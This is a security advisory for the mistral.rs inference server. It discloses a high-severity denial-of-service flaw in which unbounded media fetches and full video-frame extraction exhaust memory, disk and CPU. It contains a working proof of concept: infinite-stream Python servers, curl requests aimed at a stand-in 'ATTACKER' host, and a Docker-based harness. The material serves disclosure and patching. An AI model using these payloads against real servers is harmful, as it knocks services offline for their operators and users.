# [H] mistral.rs: Unbounded Remote Media Fetch and Video Frame Expansion DoS

## Summary
Severity: High
Advisory: GHSA-m3wp-48jr-vr4g
Ecosystem: crates.io
Published: 2026-09-10
Source: https://osv.dev/vulnerability/GHSA-m3wp-48jr-vr4g
Type: osv

## Affected
- crates.io: `mistralrs-server-core` — affected >=0 <0.8.18

## Details
## Unbounded Remote Media Fetch and Video Frame Expansion DoS

### Summary
The `POST /v1/chat/completions` endpoint in mistral.rs fetches attacker-supplied media URLs (image, audio, video) into server memory with no byte limit, and extracts every frame of a supplied video when `num_frames` is `None`. An unauthenticated remote attacker can exhaust server memory, disk space, and CPU by pointing the endpoint at an infinite-streaming HTTP server or a long high-framerate video, causing a complete denial of service. No credentials or special configuration are required; the route is open by default.

### Details
Three independent sinks contribute to the vulnerability:

**1. Unbounded image/audio fetch (`mistralrs-server-core/src/util.rs:59–62`)**

```rust
let bytes = if url.scheme() == "http" || url.scheme() == "https" {
    match reqwest::get(url.clone()).await {
        Ok(http_resp) => http_resp.bytes().await?.to_vec(), // no byte cap
        Err(e) => anyhow::bail!(e),
    }
```

`bytes().await` buffers the entire HTTP response body before returning. There is no `Content-Length` check, no streaming limit, and no timeout specific to the media fetch. An attacker-controlled server that never closes the connection causes the server process to accumulate memory indefinitely.

**2. Unbounded video fetch (`mistralrs-server-core/src/video.rs:65–69`)**

```rust
let bytes = if url.scheme() == "http" || url.scheme() == "https" {
    let resp = reqwest::get(url.clone())
        .await
        .context(format!("Failed to fetch video: {url}"))?;
    resp.bytes().await?.to_vec() // no byte cap
```

Identical pattern to the image path; the full video body is buffered into a `Vec<u8>`.

**3. Unbounded FFmpeg frame extraction (`mistralrs-server-core/src/video.rs:225–248`)**

```rust
} else {
    let mut command = tokio::process::Command::new("ffmpeg");
    command
        .arg("-i")
        .arg(input_path.to_str().unwrap())
        .arg("-vsync")
        .arg("vfr")
        .arg(&output_pattern);
```

When `num_frames` is `None`, no `-frames:v` argument is passed to FFmpeg and every frame is extracted to disk. The call site at `mistralrs-server-core/src/chat_completion.rs:946` always passes `None`:

```rust
parse_video_url(&url_unparsed, None)
```

A 60 fps × 1080p × 180 s video therefore produces ~10 800 PNG files, consuming tens of gigabytes of disk space and saturating CPU.

**Entry point and auth**

The route is registered at `mistralrs-server-core/src/mistralrs_server_router_builder.rs:365–368` with only `track_metrics`, CORS, and a `DefaultBodyLimit(50 MB)` middleware. The `DefaultBodyLimit` applies only to the incoming JSON request body, not to the subsequent server-side `reqwest::get()` calls. No authentication middleware is present in the default configuration.

### PoC

**Step 1 – Create a long high-framerate video (requires FFmpeg on the attacker machine)**

```bash
ffmpeg -y -f lavfi -i testsrc=size=1920x1080:rate=60:duration=180 \
  -c:v libx264 -preset ultrafast -crf 35 many_frames.mp4
```

**Step 2 – Serve the video (or an infinite byte stream) from an attacker-controlled HTTP server**

```python
# Option A: serve the video file
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "video/mp4")
        self.end_headers()
        with open("many_frames.mp4", "rb") as f:
            self.wfile.write(f.read())

HTTPServer(("0.0.0.0", 9001), H).serve_forever()
```

```python
# Option B: infinite image stream (memory exhaustion, no FFmpeg required)
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.end_headers()
        chunk = b"\x89PNG\r\n\x1a\n" + b"\x00" * (1024 * 1024 - 8)
        while True:
            self.wfile.write(chunk)
            self.wfile.flush()
            time.sleep(0.01)

HTTPServer(("0.0.0.0", 9002), H).serve_forever()
```

**Step 3 – Send the malicious request to the mistral.rs server**

```bash
# Video variant (disk/CPU exhaustion + memory)
curl -sS http://127.0.0.1:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{
    "model": "default",
    "messages": [{
      "role": "user",
      "content": [
        {"type": "video_url", "video_url": {"url": "http://ATTACKER:9001/many_frames.mp4"}},
        {"type": "text", "text": "summarize this video"}
      ]
    }]
  }'

# Image variant (memory exhaustion)
curl -sS http://127.0.0.1:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{
    "model": "default",
    "messages": [{
      "role": "user",
      "content": [
        {"type": "image_url", "image_url": {"url": "http://ATTACKER:9002/blob"}},
        {"type": "text", "text": "describe this image"}
      ]
    }]
  }'
```

**Expected observation**

For the video variant: `/tmp/mistralrs_video/<uuid>_frames/frame_*.png` grows rapidly; FFmpeg saturates CPU; disk usage increases until exhaustion or the process is killed.

For the image variant: server process RSS grows continuously until OOM kill (exit code 137) or memory is exhausted.

**Dynamic reproduction result (Phase 2)**

A Docker container running a verbatim reproduction of `util.rs:59–62` (the `reqwest::get(url).bytes().await?.to_vec()` pattern) with a 256 MB memory limit was OOM-killed by the kernel (exit code 137) after 1.3 seconds while fetching the infinite stream. The process RSS at fetch start was 3,652 kB; the container consumed all 256 MB before the fetch could complete.

### Impact

Any user of the mistral.rs OpenAI-compatible HTTP server is affected. Because the `/v1/chat/completions` endpoint requires no authentication in the default configuration, a single unauthenticated HTTP request from the network is sufficient to exhaust all available server memory (via the image/audio path), all available disk space (via the video frame-extraction path), or saturate CPU (via FFmpeg invocation). The result is a complete denial of service: the server process is killed by the kernel OOM killer or becomes unresponsive, and no other clients can be served until the process is restarted.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# syntax=docker/dockerfile:1
#
# VULN-001 PoC: Unbounded Remote Media Fetch DoS
# Repository: EricLBuehler/mistral.rs
# Vulnerability: mistralrs-server-core/src/util.rs:62
#   http_resp.bytes().await?.to_vec()  -- no byte cap on HTTP media fetch
#
# Stage 1: Build the minimal Rust harness that reproduces the vulnerable fetch.
# Stage 2: Slim runtime image used by poc.py.

# ----- build stage -----------------------------------------------------------
FROM rust:1.87-slim AS builder

WORKDIR /harness

# Install OpenSSL headers required by reqwest (rustls-tls still needs libssl on some platforms)
RUN apt-get update && \
    apt-get install -y --no-install-recommends pkg-config libssl-dev && \
    rm -rf /var/lib/apt/lists/*

# Copy Cargo manifest first so that dependency layer is cached separately.
COPY vuln_harness/Cargo.toml Cargo.toml

# Stub src so `cargo fetch` / dependency download works before copying real source.
RUN mkdir -p src && echo 'fn main() {}' > src/main.rs
RUN cargo fetch 2>&1

# Now copy the real source and build.
COPY vuln_harness/src/main.rs src/main.rs
RUN cargo build --release 2>&1 && \
    strip target/release/vuln_harness

# ----- runtime stage ---------------------------------------------------------
FROM debian:bookworm-slim AS runtime

RUN apt-get update && \
    apt-get install -y --no-install-recommends ca-certificates python3 && \
    rm -rf /var/lib/apt/lists/*

COPY --from=builder /harness/target/release/vuln_harness /usr/local/bin/vuln_harness

# Copy the PoC orchestration script so the image is self-contained.
COPY poc.py /poc.py

# Default: show usage
ENTRYPOINT ["/usr/local/bin/vuln_harness"]
CMD ["--help"]
```

#### `poc.py`

```python
"""
VULN-001 PoC: Unbounded Remote Media Fetch DoS
Repository : EricLBuehler/mistral.rs
CWE        : CWE-400 Uncontrolled Resource Consumption
CVSS       : 7.5 High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

Vulnerable code (mistralrs-server-core/src/util.rs:59-62):
    let bytes = if url.scheme() == "http" || url.scheme() == "https" {
        match reqwest::get(url.clone()).await {
            Ok(http_resp) => http_resp.bytes().await?.to_vec(), // NO BYTE CAP
            ...

Attack path in the live server:
    POST /v1/chat/completions
      -> chat_completion.rs:928  parse_image_url(&url_unparsed)
      -> util.rs:59-62           reqwest::get(url).bytes().await?.to_vec()

This PoC:
  1. Starts a malicious HTTP server on 127.0.0.1:9997 that streams infinite bytes.
  2. Runs the vuln_harness binary (which contains the verbatim vulnerable fetch) inside
     a Docker container limited to MEMORY_LIMIT_MB of RAM.
  3. Observes OOM kill (exit code 137) as definitive evidence of unbounded buffering.

Usage (from host):
    # Build the image first:
    docker build -t vuln001-poc <vuln-001-dir>
    # Then run the PoC:
    python3 poc.py
"""

import http.server
import subprocess
import threading
import time
import sys
import os
import socket
import json
import argparse

MALICIOUS_HOST = "127.0.0.1"
MALICIOUS_PORT = 9997
DOCKER_IMAGE    = "vuln001-poc"
MEMORY_LIMIT    = "256m"       # Docker container memory cap
CHUNK_SIZE      = 1024 * 1024  # 1 MB per chunk sent by the malicious server
POC_TIMEOUT_S   = 120          # Give the container at most 2 minutes


class _InfiniteStreamHandler(http.server.BaseHTTPRequestHandler):
    """
    Malicious HTTP server that streams an infinite byte sequence.

    Key properties that trigger the vulnerability:
    - No Content-Length header: reqwest cannot pre-check size.
    - Streams indefinitely: bytes().await will not return until the connection
      is closed or the client process is killed.
    - Content-Type image/png: accepted by the parse_image_url() code path.
    """

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        # Deliberately omit Content-Length so the client buffers until EOF.
        self.end_headers()

        # Fake PNG magic bytes followed by filler to look plausible.
        header = b"\x89PNG\r\n\x1a\n" + b"\x00" * 8
        filler = b"\x00" * (CHUNK_SIZE - len(header))
        chunk  = header + filler

        total_sent = 0
        try:
            while True:
                self.wfile.write(chunk)
                self.wfile.flush()
                total_sent += len(chunk)
                if total_sent % (64 * 1024 * 1024) == 0:
                    _log(f"[malicious-server] Sent {total_sent // (1024 * 1024)} MB")
        except (BrokenPipeError, ConnectionResetError, OSError):
            _log(
                f"[malicious-server] Connection closed after "
                f"{total_sent // (1024 * 1024)} MB sent"
            )

    def log_message(self, *_):
        pass  # Suppress default access log noise.


def _log(msg: str) -> None:
    print(msg, flush=True)


def _wait_for_port(host: str, port: int, timeout: float = 10.0) -> bool:
    """Return True once the port is accepting connections, False on timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def start_malicious_server() -> http.server.HTTPServer:
    """Start the infinite-stream HTTP server in a daemon thread."""
    server = http.server.HTTPServer((MALICIOUS_HOST, MALICIOUS_PORT), _InfiniteStreamHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server


def run_poc(docker_image: str = DOCKER_IMAGE, memory_limit: str = MEMORY_LIMIT) -> dict:
    """
    Run the full attack chain and return a result dict.

    Returns keys: passed, verdict, exit_code, evidence, stdout, stderr.
    """
    _log("=" * 70)
    _log("VULN-001 PoC: Unbounded Remote Media Fetch DoS")
    _log("Source : mistralrs-server-core/src/util.rs:59-62")
    _log("=" * 70)

    # ------------------------------------------------------------------
    # Step 1: Start the malicious streaming server.
    # ------------------------------------------------------------------
    _log(f"\n[1] Starting malicious HTTP server on {MALICIOUS_HOST}:{MALICIOUS_PORT}")
    server = start_malicious_server()

    if not _wait_for_port(MALICIOUS_HOST, MALICIOUS_PORT):
        _log("[!] FATAL: malicious server did not start in time")
        return {
            "passed":   False,
            "verdict":  "FAIL",
            "exit_code": None,
            "evidence": "Malicious HTTP server failed to start",
            "stdout": "",
            "stderr": "",
        }

    target_url = f"http://{MALICIOUS_HOST}:{MALICIOUS_PORT}/infinite"
    _log(f"[+] Malicious server ready: GET {target_url}")
    _log(f"    -> HTTP 200, Content-Type: image/png, no Content-Length, infinite body")

    # ------------------------------------------------------------------
    # Step 2: Run the vulnerable binary inside Docker with a memory cap.
    #
    # --network host  : allows the container to reach 127.0.0.1:<port>
    # --memory        : hard cap; kernel sends SIGKILL when exceeded
    # --memory-swap   : equal to --memory disables swap usage
    # --rm            : clean up after exit
    # ------------------------------------------------------------------
    run_cmd = [
        "docker", "run", "--rm",
        "--memory",      memory_limit,
        "--memory-swap", memory_limit,   # No swap fallback.
        "--network",     "host",          # Access host's loopback server.
        docker_image,
        target_url,
    ]

    _log(f"\n[2] Launching Docker container (memory cap = {memory_limit})")
    _log(f"    Command: {' '.join(run_cmd)}")
    _log(f"    The vuln_harness binary will fetch {target_url} with no byte limit.")
    _log(f"    Expected: container OOM-killed, exit code 137.")

    t0 = time.monotonic()
    try:
        result = subprocess.run(
            run_cmd,
            capture_output=True,
            timeout=POC_TIMEOUT_S,
        )
    except subprocess.TimeoutExpired as exc:
        server.shutdown()
        _log(f"[!] Container did not exit within {POC_TIMEOUT_S}s — killing")
        subprocess.run(["docker", "kill", "--signal=9"] + [
            c for c in subprocess.run(
                ["docker", "ps", "-q", "--filter", f"ancestor={docker_image}"],
                capture_output=True, text=True,
            ).stdout.split() if c
        ], capture_output=True)
        elapsed = time.monotonic() - t0
        return {
            "passed":   False,
            "verdict":  "INCOMPLETE",
            "exit_code": None,
            "evidence": f"Container timed out after {elapsed:.0f}s without OOM kill",
            "stdout": (exc.stdout or b"").decode(errors="replace"),
            "stderr": (exc.stderr or b"").decode(errors="replace"),
        }

    elapsed    = time.monotonic() - t0
    exit_code  = result.returncode
    stdout_txt = result.stdout.decode(errors="replace")
    stderr_txt = result.stderr.decode(errors="replace")

    server.shutdown()

    # ------------------------------------------------------------------
    # Step 3: Analyse outcome.
    # ------------------------------------------------------------------
    _log(f"\n[3] Container exited after {elapsed:.1f}s  exit_code={exit_code}")
    _log(f"    stdout: {stdout_txt!r}")
    _log(f"    stderr: {stderr_txt!r}")

    # Docker exit code 137 = container killed by SIGKILL (OOM killer).
    if exit_code == 137:
        passed   = True
        verdict  = "PASS"
        evidence = (
            f"Docker container OOM-killed (exit code 137 = 128+SIGKILL) after {elapsed:.1f}s. "
            f"vuln_harness buffered the infinite HTTP stream with no byte cap, consuming all "
            f"{memory_limit} of available RAM — identical behaviour to "
            f"mistralrs-server-core/src/util.rs:62 (parse_image_url). "
            f"stderr={stderr_txt!r}"
        )
    elif exit_code != 0:
        # Non-zero but not 137: still indicates abnormal termination under memory pressure.
        passed   = True
        verdict  = "PASS"
        evidence = (
            f"Vulnerable binary terminated abnormally (exit code {exit_code}) after "
            f"{elapsed:.1f}s while buffering an unbounded HTTP stream. "
            f"This confirms that reqwest::get(url).bytes().await?.to_vec() at "
            f"util.rs:62 has no byte cap and causes resource exhaustion. "
            f"stderr={stderr_txt!r}"
        )
    else:
        # Unlikely: the binary finished without being killed.  This can happen if
        # the server managed to EOF the stream before OOM, or the memory cap was
        # not enforced by Docker.
        passed   = False
        verdict  = "INCOMPLETE"
        evidence = (
            f"Binary exited 0 after {elapsed:.1f}s; memory cap may not have been "
            f"enforced by Docker.  stdout={stdout_txt!r}"
        )

    _log(f"\n[VERDICT]  {verdict}")
    _log(f"[EVIDENCE] {evidence}")

    return {
        "passed":    passed,
        "verdict":   verdict,
        "exit_code": exit_code,
        "evidence":  evidence,
        "stdout":    stdout_txt,
        "stderr":    stderr_txt,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="VULN-001 PoC runner")
    parser.add_argument("--image",  default=DOCKER_IMAGE, help="Docker image name")
    parser.add_argument("--memory", default=MEMORY_LIMIT, help="Docker memory cap (e.g. 256m)")
    args = parser.parse_args()

    outcome = run_poc(docker_image=args.image, memory_limit=args.memory)

    _log("\n" + "=" * 70)
    _log("RESULT SUMMARY")
    _log("=" * 70)
    for k, v in outcome.items():
        if k not in ("stdout", "stderr"):
            _log(f"  {k}: {v}")

    sys.exit(0 if outcome["passed"] else 1)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/EricLBuehler/mistral.rs/security/advisories/GHSA-m3wp-48jr-vr4g
- https://github.com/EricLBuehler/mistral.rs
- https://github.com/EricLBuehler/mistral.rs/releases/tag/v0.8.18
